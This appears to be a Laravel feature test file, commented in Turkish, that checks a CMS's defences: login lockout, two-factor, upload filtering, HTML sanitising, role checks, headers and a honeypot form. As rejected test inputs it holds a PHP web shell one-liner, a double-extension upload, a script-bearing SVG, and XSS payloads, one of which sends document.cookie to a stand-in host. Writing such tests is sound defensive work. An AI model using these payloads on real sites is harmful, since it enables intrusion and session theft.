<?php

namespace Tests\Feature;

use App\Livewire\Auth\Login;
use App\Models\LoginAttempt;
use App\Models\User;
use App\Services\MediaUploader;
use App\Support\Html;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Livewire\Livewire;
use Tests\TestCase;

/**
 * Sistemi WordPress'te sık görülen saldırılara karşı sınar.
 */
class SecurityTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        $this->seed();
        Storage::fake('public');
    }

    // ── Giriş ────────────────────────────────────────────────────────────

    public function test_art_arda_hatali_denemeden_sonra_kilitlenir(): void
    {
        $max = (int) config('cms.security.max_login_attempts');

        for ($i = 0; $i < $max; $i++) {
            Livewire::test(Login::class)
                ->set('email', 'admin@mimar.test')
                ->set('password', 'yanlis-sifre')
                ->call('login')
                ->assertHasErrors('email');
        }

        $this->assertSame($max, LoginAttempt::where('successful', false)->count());

        // Kilit devredeyken doğru şifre bile kabul edilmemeli.
        $user = User::where('role', 'owner')->firstOrFail();
        $user->forceFill(['email' => 'admin@mimar.test', 'password' => bcrypt('DogruSifre123')])->save();

        Livewire::test(Login::class)
            ->set('email', 'admin@mimar.test')
            ->set('password', 'DogruSifre123')
            ->call('login')
            ->assertHasErrors('email');

        $this->assertGuest();
    }

    public function test_pasif_hesap_giris_yapamaz(): void
    {
        $user = User::factory()->create([
            'email' => 'pasif@mimar.test',
            'password' => bcrypt('Deneme12345'),
            'is_active' => false,
        ]);

        Livewire::test(Login::class)
            ->set('email', 'pasif@mimar.test')
            ->set('password', 'Deneme12345')
            ->call('login')
            ->assertHasErrors('email');

        $this->assertGuest();
    }

    public function test_pasife_alinan_kullanicinin_acik_oturumu_duser(): void
    {
        $user = User::factory()->create(['role' => 'editor']);

        $this->actingAs($user)->get(route('admin.dashboard'))->assertOk();

        $user->update(['is_active' => false]);

        $this->actingAs($user)->get(route('admin.dashboard'))->assertRedirect(route('admin.login'));
    }

    public function test_iki_adimli_dogrulama_acikken_sifre_tek_basina_yetmez(): void
    {
        User::factory()->withTwoFactor()->create([
            'email' => 'iki@mimar.test',
            'password' => bcrypt('Deneme12345'),
        ]);

        Livewire::test(Login::class)
            ->set('email', 'iki@mimar.test')
            ->set('password', 'Deneme12345')
            ->call('login')
            ->assertRedirect(route('admin.two-factor'));

        $this->assertGuest();
    }

    // ── Dosya yükleme ────────────────────────────────────────────────────

    public function test_php_dosyasi_yuklenemez(): void
    {
        $this->expectException(\RuntimeException::class);

        app(MediaUploader::class)->store(
            UploadedFile::fake()->createWithContent('zararli.php', '<?php system($_GET["c"]); ?>')
        );
    }

    public function test_cift_uzantili_dosya_yuklenemez(): void
    {
        $this->expectException(\RuntimeException::class);

        app(MediaUploader::class)->store(
            UploadedFile::fake()->createWithContent('resim.php.jpg', 'GIF89a<?php echo 1; ?>')
        );
    }

    public function test_uzantisi_yalan_soyleyen_dosya_yuklenemez(): void
    {
        $this->expectException(\RuntimeException::class);

        // .jpg uzantılı ama içeriği görsel olmayan dosya
        app(MediaUploader::class)->store(
            UploadedFile::fake()->createWithContent('sahte.jpg', 'bu bir görsel değil')
        );
    }

    public function test_betik_iceren_svg_reddedilir(): void
    {
        $this->expectException(\RuntimeException::class);

        app(MediaUploader::class)->store(
            UploadedFile::fake()->createWithContent(
                'logo.svg',
                '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
            )
        );
    }

    public function test_gecerli_gorsel_yuklenir_ve_boyutlari_uretilir(): void
    {
        $media = app(MediaUploader::class)->store(
            UploadedFile::fake()->image('urun.jpg', 1600, 1200)
        );

        $this->assertSame('image', $media->type);
        $this->assertNotEmpty($media->variants, 'Küçük boyutlar üretilmeliydi.');
        Storage::disk('public')->assertExists($media->path);
    }

    // ── İçerik temizliği ─────────────────────────────────────────────────

    public function test_zengin_metinden_betik_temizlenir(): void
    {
        $clean = Html::sanitize(
            '<p>Merhaba</p><script>fetch("//kotu.site?c="+document.cookie)</script>'
            .'<img src=x onerror="alert(1)"><a href="javascript:alert(1)">tıkla</a>'
        );

        $this->assertStringContainsString('<p>Merhaba</p>', $clean);
        $this->assertStringNotContainsString('<script', $clean);
        $this->assertStringNotContainsString('onerror', $clean);
        $this->assertStringNotContainsString('javascript:', $clean);
    }

    // ── Yetkilendirme ────────────────────────────────────────────────────

    public function test_yazar_kullanici_yonetemez(): void
    {
        $author = User::factory()->create(['role' => 'author']);

        $this->actingAs($author)->get(route('admin.users.index'))->assertForbidden();
        $this->actingAs($author)->get(route('admin.settings.security'))->assertForbidden();
    }

    public function test_guvenlik_basliklari_gonderilir(): void
    {
        $this->get('/')
            ->assertHeader('X-Content-Type-Options', 'nosniff')
            ->assertHeader('X-Frame-Options', 'SAMEORIGIN')
            ->assertHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
    }

    // ── Form güvenliği ───────────────────────────────────────────────────

    public function test_tuzak_alani_dolduran_bot_reddedilir(): void
    {
        $this->post(route('form.submit', 'iletisim'), [
            'ad' => 'Bot',
            'eposta' => 'bot@spam.test',
            'mesaj' => 'reklam',
            'onay' => '1',
            'website' => 'https://spam.test',   // ziyaretçiye görünmeyen alan
        ])->assertStatus(422);

        $this->assertDatabaseCount('form_submissions', 0);
    }

    public function test_gercek_gonderim_kaydedilir(): void
    {
        $this->post(route('form.submit', 'iletisim'), [
            'ad' => 'Anıl Pekesen',
            'eposta' => 'anil@ornek.com',
            'mesaj' => 'Ürünleriniz hakkında bilgi almak istiyorum.',
            'onay' => '1',
            '_ts' => now()->subSeconds(20)->timestamp,
        ])->assertRedirect();

        $this->assertDatabaseCount('form_submissions', 1);
    }

    public function test_zorunlu_onay_kutusu_isaretlenmeden_gonderilemez(): void
    {
        $this->from('/')->post(route('form.submit', 'iletisim'), [
            'ad' => 'Anıl',
            'eposta' => 'anil@ornek.com',
            'mesaj' => 'Merhaba',
            '_ts' => now()->subSeconds(20)->timestamp,
        ])->assertSessionHasErrors('onay', null, 'form-iletisim');

        $this->assertDatabaseCount('form_submissions', 0);
    }
}
